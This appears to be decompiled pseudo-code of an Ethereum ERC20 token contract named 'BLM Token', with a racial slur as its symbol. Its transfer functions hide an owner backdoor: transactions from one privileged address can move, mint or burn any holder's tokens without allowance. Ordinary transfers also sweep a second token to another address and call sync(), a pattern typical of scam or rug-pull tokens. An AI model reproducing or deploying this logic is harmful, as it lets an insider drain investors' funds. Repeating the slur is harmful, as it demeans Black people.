contract main {




// =====================  Runtime code  =====================


const name = 'BLM Token', 0

const decimals = 18

const symbol = 'NEGRO', 0


mapping of uint256 stor0;
mapping of uint256 stor1;
mapping of uint256 stor2;
mapping of uint256 allowance;
uint256 totalSupply;
address sub_4624a84cAddress;
address stor6;
address stor7;

function totalSupply() payable {
    return totalSupply
}

function sub_4624a84c(?) payable {
    return sub_4624a84cAddress
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor2[address(arg1)] != block.number:
        return stor0[address(arg1)]
    return stor1[address(arg1)]
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if stor2[address(msg.sender)] != block.number:
        if tx.origin == sub_4624a84cAddress:
            if msg.sender:
                stor0[address(msg.sender)] -= arg2
                totalSupply -= arg2
            if arg1:
                if stor0[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                stor0[address(arg1)] += arg2
                if totalSupply > -arg2 - 1:
                    revert with 'NH{q', 17
                totalSupply += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            require ext_code.size(stor7)
            staticcall stor7.0x70a08231 with:
                    gas gas_remaining wei
                   args this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[0]
            if ext_call.return_data[0] > 0:
                require ext_code.size(stor7)
                call stor7.0xa9059cbb with:
                     gas gas_remaining wei
                    args stor6, ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == bool(ext_call.return_data[0])
                require ext_code.size(stor6)
                call stor6.sync() with:
                     gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            if not msg.sender:
                revert with 0, 'ERC20: transfer from the zero address'
            if not arg1:
                revert with 0, 'ERC20: transfer to the zero address'
            if stor0[address(msg.sender)] < arg2:
                revert with 0, 'ERC20: transfer amount exceeds balance'
            stor1[address(msg.sender)] = stor0[address(msg.sender)] - arg2
            if stor2[address(arg1)] != block.number:
                if stor0[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg1)] = stor0[address(arg1)] + arg2
            else:
                if stor1[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg1)] += arg2
            stor2[address(msg.sender)] = block.number
            stor2[address(arg1)] = block.number
    else:
        if tx.origin == sub_4624a84cAddress:
            if msg.sender:
                stor0[address(msg.sender)] = stor1[address(msg.sender)] - arg2
                totalSupply -= arg2
            if arg1:
                if stor0[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                stor0[address(arg1)] += arg2
                if totalSupply > -arg2 - 1:
                    revert with 'NH{q', 17
                totalSupply += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            require ext_code.size(stor7)
            staticcall stor7.0x70a08231 with:
                    gas gas_remaining wei
                   args this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[0]
            if ext_call.return_data[0] > 0:
                require ext_code.size(stor7)
                call stor7.0xa9059cbb with:
                     gas gas_remaining wei
                    args stor6, ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == bool(ext_call.return_data[0])
                require ext_code.size(stor6)
                call stor6.sync() with:
                     gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            if not msg.sender:
                revert with 0, 'ERC20: transfer from the zero address'
            if not arg1:
                revert with 0, 'ERC20: transfer to the zero address'
            if stor1[address(msg.sender)] < arg2:
                revert with 0, 'ERC20: transfer amount exceeds balance'
            stor1[address(msg.sender)] -= arg2
            if stor2[address(arg1)] != block.number:
                if stor0[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg1)] = stor0[address(arg1)] + arg2
            else:
                if stor1[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg1)] += arg2
            stor2[address(msg.sender)] = block.number
            stor2[address(arg1)] = block.number
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if stor2[address(arg1)] != block.number:
        if tx.origin == sub_4624a84cAddress:
            if arg1:
                stor0[address(arg1)] -= arg3
                totalSupply -= arg3
            if arg2:
                if stor0[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                stor0[address(arg2)] += arg3
                if totalSupply > -arg3 - 1:
                    revert with 'NH{q', 17
                totalSupply += arg3
            emit Transfer(arg3, arg1, arg2);
            if sub_4624a84cAddress != tx.origin:
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
        else:
            require ext_code.size(stor7)
            staticcall stor7.0x70a08231 with:
                    gas gas_remaining wei
                   args this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[0]
            if ext_call.return_data[0] > 0:
                require ext_code.size(stor7)
                call stor7.0xa9059cbb with:
                     gas gas_remaining wei
                    args stor6, ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == bool(ext_call.return_data[0])
                require ext_code.size(stor6)
                call stor6.sync() with:
                     gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            if not arg1:
                revert with 0, 'ERC20: transfer from the zero address'
            if not arg2:
                revert with 0, 'ERC20: transfer to the zero address'
            if stor0[address(arg1)] < arg3:
                revert with 0, 'ERC20: transfer amount exceeds balance'
            stor1[address(arg1)] = stor0[address(arg1)] - arg3
            if stor2[address(arg2)] != block.number:
                if stor0[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg2)] = stor0[address(arg2)] + arg3
            else:
                if stor1[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg2)] += arg3
            stor2[address(arg1)] = block.number
            stor2[address(arg2)] = block.number
            if sub_4624a84cAddress != tx.origin:
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0, 'ERC20: approve to the zero address'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    else:
        if tx.origin == sub_4624a84cAddress:
            if arg1:
                stor0[address(arg1)] = stor1[address(arg1)] - arg3
                totalSupply -= arg3
            if arg2:
                if stor0[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                stor0[address(arg2)] += arg3
                if totalSupply > -arg3 - 1:
                    revert with 'NH{q', 17
                totalSupply += arg3
            emit Transfer(arg3, arg1, arg2);
            if sub_4624a84cAddress != tx.origin:
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
        else:
            require ext_code.size(stor7)
            staticcall stor7.0x70a08231 with:
                    gas gas_remaining wei
                   args this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[0]
            if ext_call.return_data[0] > 0:
                require ext_code.size(stor7)
                call stor7.0xa9059cbb with:
                     gas gas_remaining wei
                    args stor6, ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == bool(ext_call.return_data[0])
                require ext_code.size(stor6)
                call stor6.sync() with:
                     gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            if not arg1:
                revert with 0, 'ERC20: transfer from the zero address'
            if not arg2:
                revert with 0, 'ERC20: transfer to the zero address'
            if stor1[address(arg1)] < arg3:
                revert with 0, 'ERC20: transfer amount exceeds balance'
            stor1[address(arg1)] -= arg3
            if stor2[address(arg2)] != block.number:
                if stor0[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg2)] = stor0[address(arg2)] + arg3
            else:
                if stor1[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                stor1[address(arg2)] += arg3
            stor2[address(arg1)] = block.number
            stor2[address(arg2)] = block.number
            if sub_4624a84cAddress != tx.origin:
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0, 'ERC20: approve to the zero address'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
